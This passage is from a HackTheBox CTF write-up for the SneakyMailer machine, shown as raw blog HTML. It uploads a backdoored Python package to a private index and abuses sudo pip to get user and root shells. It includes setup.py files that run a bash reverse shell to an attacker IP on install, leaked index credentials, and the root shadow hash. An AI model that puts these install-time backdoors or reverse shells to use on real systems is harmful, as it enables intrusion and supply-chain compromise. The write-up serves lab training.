</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ini data-lang=ini><span class=line><span class=cl><span class=k>[distutils]</span>
</span></span><span class=line><span class=cl><span class=na>index-servers</span> <span class=o>=</span> <span class=s>local</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>[local]</span>
</span></span><span class=line><span class=cl><span class=na>repository: http://pypi.sneakycorp.htb:8080/</span>
</span></span><span class=line><span class=cl><span class=na>username: pypi</span>
</span></span><span class=line><span class=cl><span class=na>password: soufianeelhaoui</span>
</span></span></code></pre></td></tr></table></div></div><p>And of course we will need <code>setup.py</code> for setuptools.</p><p>Let&rsquo;s look at the <a href=https://python-packaging.readthedocs.io/en/latest/minimal.html>Minimal Structure</a> required:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cyfun/
</span></span><span class=line><span class=cl>    cyfun/
</span></span><span class=line><span class=cl>        __init__.py
</span></span><span class=line><span class=cl>    setup.py
</span></span></code></pre></td></tr></table></div></div><p><code>setup.py</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>setuptools</span> <span class=kn>import</span> <span class=n>setup</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>setup</span><span class=p>(</span><span class=n>name</span><span class=o>=</span><span class=s1>&#39;cyfun&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>version</span><span class=o>=</span><span class=s1>&#39;0.1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>description</span><span class=o>=</span><span class=s1>&#39;cyfun de mon pwnage&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>url</span><span class=o>=</span><span class=s1>&#39;https://pwn.by/cyfun&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>author</span><span class=o>=</span><span class=s1>&#39;cyfun&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>author_email</span><span class=o>=</span><span class=s1>&#39;cyfun@example.com&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>license</span><span class=o>=</span><span class=s1>&#39;MIT&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>packages</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;cyfun&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>      <span class=n>zip_safe</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s run <code>python setup.py sdist upload -r local</code> to package it and upload
it.</p><p>Then we can see the package cyfun indexed and removed a few seconds later.
Let&rsquo;s add a backdoor in the package.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>setuptools</span> <span class=kn>import</span> <span class=n>setup</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;echo &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.174/8080 0&gt;&amp;1&#39; | /bin/bash&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>setup</span><span class=p>(</span><span class=n>name</span><span class=o>=</span><span class=s1>&#39;cyfun&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>version</span><span class=o>=</span><span class=s1>&#39;0.1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>description</span><span class=o>=</span><span class=s1>&#39;cyfun de mon pwnage&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>url</span><span class=o>=</span><span class=s1>&#39;https://pwn.by/cyfun&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>author</span><span class=o>=</span><span class=s1>&#39;cyfun&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>author_email</span><span class=o>=</span><span class=s1>&#39;cyfun@example.com&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>license</span><span class=o>=</span><span class=s1>&#39;MIT&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>packages</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;cyfun&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>      <span class=n>zip_safe</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Here we got a shell as low:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ low@sneakymailer:~$ id
</span></span><span class=line><span class=cl>uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
</span></span><span class=line><span class=cl>,111(bluetooth),119(pypi-pkg)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>low@sneakymailer:~$ cat user.txt
</span></span><span class=line><span class=cl>70ac4f2e6be3aece2eed49ecb6f80d7d
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-low-to-root>Privilege Escalation of Machine : from low to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-low-to-root>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ printf %s &#39;ssh-rsa &lt;pubkey&gt; cyfun@penarch&#39; &gt;&gt; ~/.ssh/authorized_keys
</span></span><span class=line><span class=cl>$ ssh -i ~/.ssh/id_rsa low@10.10.10.197
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s look for low hanging fruits:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>low@sneakymailer:~$ sudo -l
</span></span><span class=line><span class=cl>sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
</span></span><span class=line><span class=cl>Matching Defaults entries for low on sneakymailer:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User low may run the following commands on sneakymailer:
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /usr/bin/pip
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s create a very minimal backdoored package:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>low@sneakymailer:~$ mktemp -d
</span></span><span class=line><span class=cl>/tmp/tmp.lIuPOXEbwZ
</span></span><span class=line><span class=cl>low@sneakymailer:~$ cd /tmp/tmp.lIuPOXEbwZ
</span></span><span class=line><span class=cl>low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ vim.tiny setup.py
</span></span><span class=line><span class=cl>low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ sudo /usr/bin/pip3 install 
</span></span></code></pre></td></tr></table></div></div><p><code>setup.py</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;echo &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.174/8080 0&gt;&amp;1&#39; | /bin/bash&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>When executed we retrieve the root shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@sneakymailer:/tmp/pip-req-build-lp_bvi48# id
</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root)
</span></span><span class=line><span class=cl>root@sneakymailer:/tmp/pip-req-build-lp_bvi48# cd
</span></span><span class=line><span class=cl>root@sneakymailer:~# cat root.txt
</span></span><span class=line><span class=cl>602b7d042c33e19fdf079cfef493eb60
</span></span><span class=line><span class=cl>root@sneakymailer:~# cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>